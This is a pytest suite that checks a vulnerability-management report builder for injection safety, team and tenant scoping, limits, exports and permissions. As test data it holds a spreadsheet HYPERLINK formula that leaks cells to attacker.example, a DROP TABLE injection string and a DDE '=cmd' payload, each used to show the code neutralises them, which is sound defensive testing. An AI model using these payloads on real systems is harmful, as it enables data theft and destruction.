"""Phase 50 - the report builder: ad-hoc reports that cannot escape authorization.

The builder is a query surface that operators drive with their own input, so
the properties tested here are the ones that would make it dangerous if they
slipped:

* there is no SQL from the client: anything outside the catalog is a 422, and
  a hostile value is a bound parameter that matches nothing;
* `contains` escapes LIKE wildcards, so a value cannot widen its own match;
* a restricted operator's report -- rows, group counts, derived counts and
  exports -- covers their team slice and nothing else;
* one tenant never sees another's rows or saved reports (404, not 403);
* every limit holds, and the statement runs under its own timeout;
* a saved spec that the catalog has outgrown fails as a 422 naming the field;
* exported cells that a spreadsheet would execute are neutralised, in the
  SHARED renderer (so the fixed reports are protected too);
* exports carry provenance and are audited.
"""
from __future__ import annotations

import csv
import dataclasses
import datetime as dt
import io
import json
import uuid

import pytest
from sqlalchemy import select, text

from veyrs.db import SessionLocal, set_tenant
from veyrs.models import (
    Asset, AuditLog, BusinessService, Cve, Finding, Role, Team, Ticket, Vulnerability,
)
from veyrs.models.risk_register import RiskEntry, RiskRaci
from veyrs.security.scope import UNRESTRICTED
from veyrs.services import report_builder as builder, reporting

from conftest import login

PASSWORD = "Str0ng-Passw0rd!x"
RUN = "/api/v1/report-builder/run"
EXPORT = "/api/v1/report-builder/export"
QUERIES = "/api/v1/report-builder/queries"

FORMULA = '=HYPERLINK("https://attacker.example/?"&A1,"open")'


def _headers(client, email, slug):
    return {"Authorization": f"Bearer {login(client, email, slug, PASSWORD)['access_token']}"}


def _user(client, admin, slug, roles, scope_team_ids=None):
    email = f"u-{uuid.uuid4().hex[:8]}@{slug}.test"
    body = {"email": email, "full_name": "Report User", "password": PASSWORD,
            "role_slugs": roles}
    if scope_team_ids:
        body["team_ids"] = [str(t) for t in scope_team_ids]
        body["scope_team_ids"] = [str(t) for t in scope_team_ids]
    created = client.post("/api/v1/users", headers=admin, json=body)
    assert created.status_code == 201, created.text
    return _headers(client, email, slug)


@pytest.fixture()
def estate(client, admin_a, org_a):
    """Two teams, two business services, an orphan asset, and findings whose
    EFFECTIVE owner differs from their asset's team in one deliberate case."""
    org_id, slug, _ = org_a
    now = dt.datetime.now(dt.timezone.utc)
    with SessionLocal() as session:
        set_tenant(session, org_id)
        netops = Team(organization_id=org_id, name="Netops", slug=f"net-{uuid.uuid4().hex[:6]}")
        appsec = Team(organization_id=org_id, name="Appsec", slug=f"app-{uuid.uuid4().hex[:6]}")
        payments = BusinessService(organization_id=org_id, name="Payments",
                                   criticality="critical")
        intranet = BusinessService(organization_id=org_id, name="Intranet")
        session.add_all([netops, appsec, payments, intranet])
        session.flush()
        net_asset = Asset(organization_id=org_id, name="rb-net-01", team_id=netops.id,
                          business_service_id=payments.id, criticality="critical",
                          exposure="internet")
        app_asset = Asset(organization_id=org_id, name="rb-app-01", team_id=appsec.id,
                          business_service_id=intranet.id, criticality="medium")
        orphan = Asset(organization_id=org_id, name="rb-orphan-01")
        session.add_all([net_asset, app_asset, orphan])
        session.flush()

        vulns = {}
        for label in ("net", "app", "orphan"):
            cve_id = f"CVE-2026-{uuid.uuid4().int % 90000 + 9000}"
            session.merge(Cve(id=cve_id, source="test", title=label))
            vuln = Vulnerability(organization_id=org_id, cve_id=cve_id,
                                 title=f"{label} vulnerability", severity="critical")
            session.add(vuln)
            session.flush()
            vulns[label] = vuln

        def finding(asset, vuln, title, severity, days, state="new", team=None, kev=False,
                    cvss=None):
            row = Finding(organization_id=org_id, asset_id=asset.id,
                          vulnerability_id=vuln.id, state=state,
                          dedupe_key=uuid.uuid4().hex, title=title, severity=severity,
                          first_seen_at=now - dt.timedelta(days=days),
                          assigned_team_id=team.id if team else None, kev=kev,
                          cvss_score=cvss, risk_score=50.0)
            session.add(row)
            return row

        rows = {
            "net1": finding(net_asset, vulns["net"], "SQL injection 50% off", "critical", 10,
                            kev=True, cvss=9.8),
            "net2": finding(net_asset, vulns["net"], "Weak cipher_suite", "high", 20, cvss=7.0),
            # On a netops asset but explicitly assigned to appsec: its EFFECTIVE
            # owner is appsec, so netops must not see it.
            "netx": finding(net_asset, vulns["net"], "Reassigned to appsec", "critical", 30,
                            team=appsec),
            "app1": finding(app_asset, vulns["app"], FORMULA, "critical", 40),
            "appc": finding(app_asset, vulns["app"], "Closed long ago", "critical", 90,
                            state="closed"),
            "orph": finding(orphan, vulns["orphan"], "Nobody owns this", "medium", 5),
        }
        session.flush()
        session.add_all([
            Ticket(organization_id=org_id, reference=f"RB-{uuid.uuid4().hex[:6]}",
                   title="netops ticket", assigned_team_id=netops.id),
            Ticket(organization_id=org_id, reference=f"RB-{uuid.uuid4().hex[:6]}",
                   title="appsec ticket", assigned_team_id=appsec.id),
        ])
        seated = RiskEntry(organization_id=org_id, code=f"RISK-{uuid.uuid4().hex[:6]}",
                           title="netops holds a seat", likelihood=4, impact=4, score=16)
        unseated = RiskEntry(organization_id=org_id, code=f"RISK-{uuid.uuid4().hex[:6]}",
                             title="nobody from netops", likelihood=1, impact=2, score=2)
        session.add_all([seated, unseated])
        session.flush()
        session.add(RiskRaci(organization_id=org_id, risk_id=seated.id, raci="R",
                             party_type="team", team_id=netops.id))
        session.commit()
        ids = {k: v.id for k, v in rows.items()}

    scoped = _user(client, admin_a, slug, ["security-manager"], [netops.id])
    return {"org_id": org_id, "slug": slug, "netops": netops.id, "appsec": appsec.id,
            "net_asset": net_asset.id, "scoped": scoped, "ids": ids, "now": now}


def _run(client, headers, spec):
    response = client.post(RUN, headers=headers, json=spec)
    assert response.status_code == 200, response.text
    return response.json()


def _titles(body):
    return sorted(r["title"] for r in body["rows"])


# ---------------------------------------------------------------------------
# 1. nothing outside the catalog
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("spec,needle", [
    ({"entity": "findings", "columns": ["password_hash"]}, "no field 'password_hash'"),
    ({"entity": "findings", "columns": ["title"],
      "filters": [{"field": "title", "op": "regex", "value": "x"}]}, "operator 'regex'"),
    ({"entity": "findings", "columns": ["title"],
      "filters": [{"field": "risk_score", "op": "contains", "value": "1"}]},
     "does not apply to risk_score"),
    ({"entity": "users", "columns": ["email"]}, "unknown entity"),
    ({"entity": "findings", "columns": ["title"], "sql": "select 1"}, "unknown spec key"),
    ({"entity": "findings", "columns": ["title"],
      "filters": [{"field": "severity", "op": "eq", "value": "apocalyptic"}]},
     "not a severity"),
    ({"entity": "findings", "group_by": ["age_days"]}, "cannot be grouped"),
    ({"entity": "findings", "columns": ["title"],
      "filters": [{"field": "title", "op": "eq", "value": "x", "raw": "1=1"}]},
     "unknown key"),
    ({"entity": "findings", "group_by": ["severity"], "columns": ["title"]},
     "columns must be empty"),
    ({"entity": "findings", "group_by": ["severity"],
      "aggregates": [{"fn": "avg", "field": "title"}]}, "avg does not apply"),
    ({"entity": "findings", "group_by": ["severity"],
      "sort": [{"field": "title", "dir": "asc"}]}, "a grouped report sorts by"),
])
def test_anything_outside_the_catalog_is_a_422(client, admin_a, spec, needle):
    response = client.post(RUN, headers=admin_a, json=spec)
    assert response.status_code == 422, response.text
    assert needle in response.json()["detail"]


def test_the_catalog_offers_every_entity_with_typed_fields(client, admin_a):
    body = client.get("/api/v1/report-builder/catalog", headers=admin_a).json()
    keys = {e["key"] for e in body["entities"]}
    assert {"findings", "assets", "vulnerabilities", "tickets", "risks"} <= keys
    findings = next(e for e in body["entities"] if e["key"] == "findings")
    by_key = {f["key"]: f for f in findings["fields"]}
    for wanted in ("asset.name", "asset.criticality", "asset.business_service",
                   "owning_team.name", "vulnerability.cve_id", "kev", "epss_score",
                   "age_days"):
        assert wanted in by_key, wanted
    assert by_key["severity"]["type"] == "enum" and "critical" in by_key["severity"]["values"]
    assert body["limits"]["run_rows"] == builder.RUN_LIMIT
    assert body["limits"]["export_rows"] == builder.EXPORT_LIMIT


def test_every_catalog_field_compiles_and_runs(client, admin_a, estate):
    """A catalog entry that 500s is found here, not by the first operator to tick it."""
    for entity in builder.CATALOG.values():
        keys = [f.key for f in entity.fields]
        for start in range(0, len(keys), builder.MAX_COLUMNS):
            _run(client, admin_a, {"entity": entity.key,
                                   "columns": keys[start:start + builder.MAX_COLUMNS]})
        for field in entity.fields:
            if field.groupable:
                _run(client, admin_a, {"entity": entity.key, "group_by": [field.key]})


# ---------------------------------------------------------------------------
# 2. values are bound parameters; LIKE wildcards are escaped
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("op", ["eq", "contains", "starts_with"])
def test_an_injection_attempt_is_a_bound_parameter(client, admin_a, estate, op):
    hostile = "x'; drop table findings;--"
    body = _run(client, admin_a, {"entity": "findings", "columns": ["title"],
                                  "filters": [{"field": "title", "op": op,
                                               "value": hostile}]})
    assert body["rows"] == []
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        assert session.execute(text("SELECT to_regclass('public.findings')")).scalar()
        assert session.execute(select(Finding.id).where(
            Finding.organization_id == estate["org_id"])).first() is not None


def test_contains_escapes_like_wildcards(client, admin_a, estate):
    def contains(value):
        return _titles(_run(client, admin_a, {
            "entity": "findings", "columns": ["title"],
            "filters": [{"field": "title", "op": "contains", "value": value}]}))

    # Unescaped, '%' matches every title and '_' every character.
    assert contains("%") == ["SQL injection 50% off"]
    assert contains("_") == ["Weak cipher_suite"]
    assert contains("50%") == ["SQL injection 50% off"]
    assert contains("\\") == []


def test_ilike_is_case_insensitive(client, admin_a, estate):
    body = _run(client, admin_a, {"entity": "findings", "columns": ["title"],
                                  "filters": [{"field": "title", "op": "contains",
                                               "value": "SQL INJECTION"}]})
    assert _titles(body) == ["SQL injection 50% off"]


# ---------------------------------------------------------------------------
# 3. grouping and aggregates are correct on a known fixture
# ---------------------------------------------------------------------------
def test_group_by_owning_team_counts_and_averages(client, admin_a, estate):
    body = _run(client, admin_a, {
        "entity": "findings", "group_by": ["owning_team.name"],
        "filters": [{"field": "is_open", "op": "eq", "value": True}],
        "aggregates": [{"fn": "count"}, {"fn": "avg", "field": "age_days"},
                       {"fn": "max", "field": "cvss_score"}],
        "sort": [{"field": "owning_team.name", "dir": "asc"}],
    })
    assert [c["key"] for c in body["columns"]] == [
        "owning_team.name", "count", "avg:age_days", "max:cvss_score"]
    groups = {r["owning_team.name"]: r for r in body["rows"]}
    # net1 (10d) + net2 (20d); netx is on a netops asset but assigned to appsec.
    assert groups["Netops"]["count"] == 2
    assert groups["Netops"]["avg:age_days"] == pytest.approx(15.0, abs=0.1)
    assert groups["Netops"]["max:cvss_score"] == pytest.approx(9.8)
    # netx (30d) + app1 (40d); the closed one is filtered out.
    assert groups["Appsec"]["count"] == 2
    assert groups["Appsec"]["avg:age_days"] == pytest.approx(35.0, abs=0.1)
    assert groups[None]["count"] == 1                     # the orphan


def test_group_by_business_service_and_severity(client, admin_a, estate):
    body = _run(client, admin_a, {
        "entity": "findings",
        "group_by": ["asset.business_service", "severity"],
        "filters": [{"field": "is_open", "op": "eq", "value": True}],
        "aggregates": [{"fn": "count"}, {"fn": "count_distinct", "field": "asset.name"}],
        "sort": [{"field": "count", "dir": "desc"}],
    })
    cells = {(r["asset.business_service"], r["severity"]): r for r in body["rows"]}
    assert cells[("Payments", "critical")]["count"] == 2        # net1, netx
    assert cells[("Payments", "critical")]["count_distinct:asset.name"] == 1
    assert cells[("Payments", "high")]["count"] == 1
    assert cells[("Intranet", "critical")]["count"] == 1
    assert body["rows"][0]["count"] == 2                       # sorted desc


def test_aggregates_without_group_by_are_one_row(client, admin_a, estate):
    body = _run(client, admin_a, {"entity": "findings",
                                  "aggregates": [{"fn": "count"}]})
    assert body["rows"] == [{"count": 6}]


def test_relative_date_filters(client, admin_a, estate):
    recent = _run(client, admin_a, {
        "entity": "findings", "columns": ["title"],
        "filters": [{"field": "first_seen_at", "op": "last_days", "value": 15}]})
    assert _titles(recent) == ["Nobody owns this", "SQL injection 50% off"]
    old = _run(client, admin_a, {
        "entity": "findings", "columns": ["title"],
        "filters": [{"field": "first_seen_at", "op": "older_than_days", "value": 35}]})
    assert _titles(old) == sorted([FORMULA, "Closed long ago"])
    since = (estate["now"] - dt.timedelta(days=25)).date().isoformat()
    until = (estate["now"] - dt.timedelta(days=15)).date().isoformat()
    window = _run(client, admin_a, {
        "entity": "findings", "columns": ["title"],
        "filters": [{"field": "first_seen_at", "op": "between", "value": [since, until]}]})
    assert _titles(window) == ["Weak cipher_suite"]


def test_risk_register_band_is_derived(client, admin_a, estate):
    body = _run(client, admin_a, {"entity": "risks", "columns": ["title", "score", "band"],
                                  "sort": [{"field": "score", "dir": "desc"}]})
    assert [(r["title"], r["band"]) for r in body["rows"]] == [
        ("netops holds a seat", "critical"), ("nobody from netops", "low")]


# ---------------------------------------------------------------------------
# 4. team scope: run, group counts, derived counts and export
# ---------------------------------------------------------------------------
def test_a_restricted_operator_reports_on_their_slice_only(client, estate):
    body = _run(client, estate["scoped"], {"entity": "findings", "columns": ["title"]})
    assert _titles(body) == ["SQL injection 50% off", "Weak cipher_suite"]
    assert body["provenance"]["scope"].startswith("restricted to 1 team")


def test_group_counts_are_scoped(client, estate):
    body = _run(client, estate["scoped"], {
        "entity": "findings", "group_by": ["asset.name"],
        "aggregates": [{"fn": "count"}]})
    # Three findings sit on rb-net-01; one is appsec's by assignment.
    assert body["rows"] == [{"asset.name": "rb-net-01", "count": 2}]


def test_derived_counts_are_scoped_too(client, admin_a, estate):
    spec = {"entity": "assets", "columns": ["name", "open_findings"],
            "sort": [{"field": "name", "dir": "asc"}]}
    whole = {r["name"]: r["open_findings"] for r in _run(client, admin_a, spec)["rows"]}
    narrow = {r["name"]: r["open_findings"] for r in _run(client, estate["scoped"], spec)["rows"]}
    assert whole["rb-net-01"] == 3
    assert narrow == {"rb-net-01": 2}


def test_vulnerabilities_tickets_and_risks_are_scoped(client, estate):
    vulns = _run(client, estate["scoped"], {"entity": "vulnerabilities",
                                            "columns": ["title", "open_findings"]})
    assert [(r["title"], r["open_findings"]) for r in vulns["rows"]] == [
        ("net vulnerability", 2)]
    tickets = _run(client, estate["scoped"], {"entity": "tickets", "columns": ["title"]})
    assert _titles(tickets) == ["netops ticket"]
    risks = _run(client, estate["scoped"], {"entity": "risks", "columns": ["title"]})
    assert _titles(risks) == ["netops holds a seat"]


def test_the_export_is_scoped_as_well(client, estate):
    response = client.post(f"{EXPORT}?format=csv", headers=estate["scoped"],
                           json={"entity": "findings", "columns": ["title", "asset.name"]})
    assert response.status_code == 200, response.text
    text_body = response.content.decode("utf-8-sig")
    assert "SQL injection 50% off" in text_body and "Weak cipher_suite" in text_body
    assert "Reassigned to appsec" not in text_body
    assert "HYPERLINK" not in text_body and "Nobody owns this" not in text_body
    assert "# scope,restricted to 1 team" in text_body


def test_a_shared_report_runs_under_the_readers_scope(client, admin_a, estate):
    saved = client.post(QUERIES, headers=admin_a, json={
        "name": "All findings", "is_shared": True,
        "spec": {"entity": "findings", "columns": ["title"]}})
    assert saved.status_code == 201, saved.text
    qid = saved.json()["id"]
    assert len(client.post(f"{QUERIES}/{qid}/run", headers=admin_a).json()["rows"]) == 6
    narrow = client.post(f"{QUERIES}/{qid}/run", headers=estate["scoped"])
    assert narrow.status_code == 200, narrow.text
    assert _titles(narrow.json()) == ["SQL injection 50% off", "Weak cipher_suite"]
    # readable, not writable
    assert client.patch(f"{QUERIES}/{qid}", headers=estate["scoped"],
                        json={"name": "mine now"}).status_code == 404
    assert client.delete(f"{QUERIES}/{qid}", headers=estate["scoped"]).status_code == 404


def test_the_service_applies_scope_without_the_http_layer(estate):
    """`run()` is the authority, not the route: a scope passed in is a scope applied."""
    from veyrs.security.scope import TeamScope

    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        result = builder.run(session, {"entity": "findings", "columns": ["title"]},
                             TeamScope(restricted=True, team_ids=frozenset({estate["appsec"]})),
                             estate["org_id"])
    assert _titles(result) == sorted([FORMULA, "Closed long ago", "Reassigned to appsec"])


# ---------------------------------------------------------------------------
# 5. tenant isolation
# ---------------------------------------------------------------------------
def test_another_tenant_never_sees_the_rows(client, admin_b, estate):
    body = _run(client, admin_b, {"entity": "findings", "columns": ["title"]})
    assert body["rows"] == []
    grouped = _run(client, admin_b, {"entity": "assets", "aggregates": [{"fn": "count"}]})
    assert grouped["rows"] == [{"count": 0}]


def test_another_tenant_cannot_reach_a_saved_report(client, admin_a, admin_b, estate):
    saved = client.post(QUERIES, headers=admin_a, json={
        "name": "Org A private", "spec": {"entity": "findings", "columns": ["title"]},
        "is_shared": True})
    qid = saved.json()["id"]
    for method, path in (("GET", f"{QUERIES}/{qid}"), ("POST", f"{QUERIES}/{qid}/run"),
                         ("POST", f"{QUERIES}/{qid}/export?format=csv"),
                         ("PATCH", f"{QUERIES}/{qid}"), ("DELETE", f"{QUERIES}/{qid}")):
        kwargs = {"json": {"name": "x"}} if method == "PATCH" else {}
        response = client.request(method, path, headers=admin_b, **kwargs)
        assert response.status_code == 404, f"{method} {path} -> {response.status_code}"
    listed = client.get(QUERIES, headers=admin_b).json()["items"]
    assert qid not in {item["id"] for item in listed}


def test_a_private_report_is_invisible_to_a_colleague(client, admin_a, estate):
    saved = client.post(QUERIES, headers=admin_a, json={
        "name": "Mine alone", "spec": {"entity": "findings", "columns": ["title"]}})
    qid = saved.json()["id"]
    assert client.get(f"{QUERIES}/{qid}", headers=estate["scoped"]).status_code == 404
    assert client.post(f"{QUERIES}/{qid}/run", headers=estate["scoped"]).status_code == 404


# ---------------------------------------------------------------------------
# 6. limits
# ---------------------------------------------------------------------------
def test_column_filter_and_group_limits(client, admin_a):
    fields = [f.key for f in builder.FINDINGS.fields]
    assert len(fields) > builder.MAX_COLUMNS
    too_many = client.post(RUN, headers=admin_a,
                           json={"entity": "findings", "columns": fields})
    assert too_many.status_code == 422 and "at most" in too_many.json()["detail"]

    filters = [{"field": "title", "op": "contains", "value": str(i)}
               for i in range(builder.MAX_FILTERS + 1)]
    response = client.post(RUN, headers=admin_a,
                           json={"entity": "findings", "columns": ["title"], "filters": filters})
    assert response.status_code == 422

    groups = ["severity", "state", "kev", "asset.name"]
    assert len(groups) > builder.MAX_GROUP_BY
    response = client.post(RUN, headers=admin_a, json={"entity": "findings", "group_by": groups})
    assert response.status_code == 422

    response = client.post(RUN, headers=admin_a, json={
        "entity": "findings", "columns": ["title"], "limit": builder.EXPORT_LIMIT + 1})
    assert response.status_code == 422

    response = client.post(RUN, headers=admin_a, json={
        "entity": "findings", "columns": ["title"],
        "filters": [{"field": "title", "op": "in",
                     "value": [str(i) for i in range(builder.MAX_IN_VALUES + 1)]}]})
    assert response.status_code == 422


def test_rows_are_capped_and_truncation_is_reported(client, admin_a, estate):
    body = _run(client, admin_a, {"entity": "findings", "columns": ["title"], "limit": 2})
    assert body["row_count"] == 2 and body["truncated"] is True
    body = _run(client, admin_a, {"entity": "findings", "columns": ["title"], "limit": 6})
    assert body["row_count"] == 6 and body["truncated"] is False
    # A spec saved for export (50 000 rows) still opens on screen, at the screen cap.
    body = _run(client, admin_a, {"entity": "findings", "columns": ["title"],
                                  "limit": builder.EXPORT_LIMIT})
    assert body["limit"] == builder.RUN_LIMIT


def test_the_statement_runs_under_its_own_timeout(estate):
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        builder.run(session, {"entity": "findings", "columns": ["title"]},
                    UNRESTRICTED, estate["org_id"])
        assert session.execute(text("SHOW statement_timeout")).scalar() == \
            builder.STATEMENT_TIMEOUT


def test_a_timed_out_report_is_a_422_not_a_500(estate, monkeypatch):
    monkeypatch.setattr(builder, "STATEMENT_TIMEOUT", "1ms")
    spec = {"entity": "findings", "group_by": ["title"], "aggregates": [{"fn": "count"}]}
    original = builder.compile

    def slow(*args, **kwargs):
        stmt, columns, normalised, effective = original(*args, **kwargs)
        from sqlalchemy import literal_column
        sleeper = literal_column("(SELECT count(*) FROM pg_sleep(0.2)) >= 0")
        return stmt.where(sleeper), columns, normalised, effective

    monkeypatch.setattr(builder, "compile", slow)
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        with pytest.raises(builder.ReportBuilderError, match="ran longer than"):
            builder.run(session, spec, UNRESTRICTED, estate["org_id"])


# ---------------------------------------------------------------------------
# 7. saved reports
# ---------------------------------------------------------------------------
def test_saved_report_crud_and_validation_on_save(client, admin_a, estate):
    bad = client.post(QUERIES, headers=admin_a, json={
        "name": "Broken", "spec": {"entity": "findings", "columns": ["nope"]}})
    assert bad.status_code == 422
    made = client.post(QUERIES, headers=admin_a, json={
        "name": "Open criticals", "description": "per team",
        "spec": {"entity": "findings", "group_by": ["owning_team.name"],
                 "filters": [{"field": "severity", "op": "eq", "value": "critical"}]}})
    assert made.status_code == 201, made.text
    body = made.json()
    assert body["is_mine"] and body["valid"]
    assert body["spec"]["aggregates"] == [{"fn": "count"}]      # normalised on save
    qid = body["id"]
    dup = client.post(QUERIES, headers=admin_a, json={
        "name": "Open criticals", "spec": {"entity": "findings", "columns": ["title"]}})
    assert dup.status_code == 422
    renamed = client.patch(f"{QUERIES}/{qid}", headers=admin_a, json={"name": "Renamed"})
    assert renamed.status_code == 200 and renamed.json()["name"] == "Renamed"
    assert client.patch(f"{QUERIES}/{qid}", headers=admin_a,
                        json={"spec": {"entity": "findings", "columns": ["x"]}}).status_code == 422
    assert client.post(f"{QUERIES}/{qid}/run", headers=admin_a).status_code == 200
    assert client.delete(f"{QUERIES}/{qid}", headers=admin_a).status_code == 204
    assert client.get(f"{QUERIES}/{qid}", headers=admin_a).status_code == 404
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        actions = set(session.execute(select(AuditLog.action).where(
            AuditLog.organization_id == estate["org_id"],
            AuditLog.object_type == "report_query")).scalars())
    assert {"report_query.create", "report_query.update", "report_query.delete"} <= actions


def test_a_spec_the_catalog_outgrew_is_a_422_naming_the_field(client, admin_a, estate,
                                                              monkeypatch):
    saved = client.post(QUERIES, headers=admin_a, json={
        "name": "Uses EPSS", "spec": {"entity": "findings",
                                      "columns": ["title", "epss_score"]}})
    qid = saved.json()["id"]
    trimmed = dataclasses.replace(
        builder.FINDINGS,
        fields=tuple(f for f in builder.FINDINGS.fields if f.key != "epss_score"))
    monkeypatch.setitem(builder.CATALOG, "findings", trimmed)

    for path in (f"{QUERIES}/{qid}/run", f"{QUERIES}/{qid}/export?format=csv"):
        response = client.post(path, headers=admin_a)
        assert response.status_code == 422, response.text
        assert "epss_score" in response.json()["detail"]
        assert "no longer matches" in response.json()["detail"]
    listed = {i["id"]: i for i in client.get(QUERIES, headers=admin_a).json()["items"]}
    assert listed[qid]["valid"] is False and "epss_score" in listed[qid]["problem"]


# ---------------------------------------------------------------------------
# 8. exports: provenance, audit, formula injection
# ---------------------------------------------------------------------------
def test_csv_export_neutralises_formulas_and_carries_provenance(client, admin_a, estate):
    response = client.post(f"{EXPORT}?format=csv", headers=admin_a,
                           json={"entity": "findings", "columns": ["title", "severity"]})
    assert response.status_code == 200, response.text
    assert "attachment" in response.headers["content-disposition"]
    text_body = response.content.decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(text_body)))
    cells = [cell for row in rows for cell in row]
    assert "'" + FORMULA in cells
    assert not [c for c in cells if c[:1] in ("=", "+", "-", "@")]
    assert "# organization" in text_body and "# generated_at" in text_body
    assert "# scope,whole estate" in text_body


def test_xlsx_export_stores_formulas_as_text(client, admin_a, estate):
    from openpyxl import load_workbook

    response = client.post(f"{EXPORT}?format=xlsx", headers=admin_a,
                           json={"entity": "findings", "columns": ["title"]})
    assert response.status_code == 200, response.text
    workbook = load_workbook(io.BytesIO(response.content))
    assert workbook.sheetnames[0] == "provenance"
    values = [c for row in workbook["report"].iter_rows() for c in row]
    assert all(c.data_type != "f" for c in values)
    assert "'" + FORMULA in [c.value for c in values]


def test_json_export_and_audit(client, admin_a, estate):
    spec = {"entity": "findings", "columns": ["title"], "limit": 3}
    response = client.post(f"{EXPORT}?format=json", headers=admin_a, json=spec)
    assert response.status_code == 200, response.text
    body = json.loads(response.content)
    assert body["provenance"]["generated_at"] and body["provenance"]["truncated"] is True
    assert body["provenance"]["parameters"]["spec"]["columns"] == ["title"]
    assert len(body["rows"]) == 3
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        entry = session.execute(select(AuditLog).where(
            AuditLog.organization_id == estate["org_id"],
            AuditLog.action == "report.exported")).scalars().first()
    assert entry is not None and entry.changes["format"] == "json"


def test_an_unknown_export_format_is_refused(client, admin_a):
    response = client.post(f"{EXPORT}?format=docx", headers=admin_a,
                           json={"entity": "findings", "columns": ["title"]})
    assert response.status_code == 422


@pytest.mark.parametrize("value,expected", [
    ("=1+1", "'=1+1"), ("+cmd", "'+cmd"), ("-2+3", "'-2+3"), ("@SUM(A1)", "'@SUM(A1)"),
    ("\t=x", "'\t=x"), ("plain", "plain"), (-5, -5), (3.5, 3.5), (None, None),
])
def test_the_shared_renderer_guards_every_cell(value, expected):
    assert reporting._cell(value) == expected


def test_the_fixed_reports_inherit_the_formula_guard(org_a):
    """The guard lives in the shared renderer, so a fixed report is covered too."""
    org_id, _, _ = org_a
    with SessionLocal() as session:
        set_tenant(session, org_id)
        session.add(Asset(organization_id=org_id, name="=cmd|' /C calc'!A0"))
        session.commit()
        payload, _, _ = reporting.render(session, org_id, "asset-register", "csv")
    cells = [c for row in csv.reader(io.StringIO(payload.decode("utf-8-sig"))) for c in row]
    assert "'=cmd|' /C calc'!A0" in cells
    assert "=cmd|' /C calc'!A0" not in cells


# ---------------------------------------------------------------------------
# 9. the permission matrix
# ---------------------------------------------------------------------------
def test_read_only_can_run_and_save_privately_but_not_share(client, admin_a, estate):
    reader = _user(client, admin_a, estate["slug"], ["read-only"])
    assert _run(client, reader, {"entity": "findings", "columns": ["title"]})["row_count"] == 6
    assert client.post(f"{EXPORT}?format=csv", headers=reader,
                       json={"entity": "findings", "columns": ["title"]}).status_code == 200
    private = client.post(QUERIES, headers=reader, json={
        "name": "Mine", "spec": {"entity": "findings", "columns": ["title"]}})
    assert private.status_code == 201, private.text
    shared = client.post(QUERIES, headers=reader, json={
        "name": "For everyone", "is_shared": True,
        "spec": {"entity": "findings", "columns": ["title"]}})
    assert shared.status_code == 403
    flip = client.patch(f"{QUERIES}/{private.json()['id']}", headers=reader,
                        json={"is_shared": True})
    assert flip.status_code == 403
    catalog = client.get("/api/v1/report-builder/catalog", headers=reader).json()
    assert catalog["can_share"] is False


def test_the_entity_permission_is_required_on_top_of_report_read(client, admin_a, estate):
    """`report:read` alone must not read findings through the report door."""
    with SessionLocal() as session:
        set_tenant(session, estate["org_id"])
        slug = f"report-only-{uuid.uuid4().hex[:6]}"
        session.add(Role(organization_id=estate["org_id"], slug=slug, name="Report only",
                         permissions=["report:read"]))
        session.commit()
    narrow = _user(client, admin_a, estate["slug"], [slug])
    response = client.post(RUN, headers=narrow, json={"entity": "findings", "columns": ["title"]})
    assert response.status_code == 403
    assert "finding:read" in response.json()["detail"]
    catalog = client.get("/api/v1/report-builder/catalog", headers=narrow).json()
    assert all(e["available"] is False for e in catalog["entities"])


def test_no_report_read_no_builder(client, admin_a, estate):
    machine = _user(client, admin_a, estate["slug"], ["service-account"])
    assert client.get("/api/v1/report-builder/catalog", headers=machine).status_code == 403
    assert client.post(RUN, headers=machine,
                       json={"entity": "findings", "columns": ["title"]}).status_code == 403


def test_the_router_is_classified_as_scoped():
    from veyrs.api.v1 import report_builder as api
    from veyrs.security.scope import SCOPED_TAGS

    assert set(api.router.tags) <= SCOPED_TAGS
